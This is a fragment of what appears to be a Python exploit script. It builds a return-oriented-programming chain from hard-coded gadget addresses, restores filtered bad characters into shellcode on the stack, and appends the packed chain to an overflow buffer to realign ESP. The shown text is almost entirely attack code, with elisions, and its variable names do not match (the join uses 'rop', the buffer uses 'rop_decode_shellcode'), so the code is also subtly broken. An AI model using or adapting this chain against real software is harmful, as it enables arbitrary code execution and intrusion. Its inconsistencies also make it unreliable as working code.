...
# ROP 2 restore bad chars into Shellcode on stack using ROP, EAX is aligned with shellcode

rop_decode += decodeShellcode(base, pos, shellcode)

rop2 = [
# #. 0x64646464 Get skeleton call addr + 0x14
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
...
rop2 = b"".join([pack("<I", r) for r in rop])
...
buf += rop_decode_shellcode     # Decode Shellcode
buf += rop2                     # Align ESP to dummy call
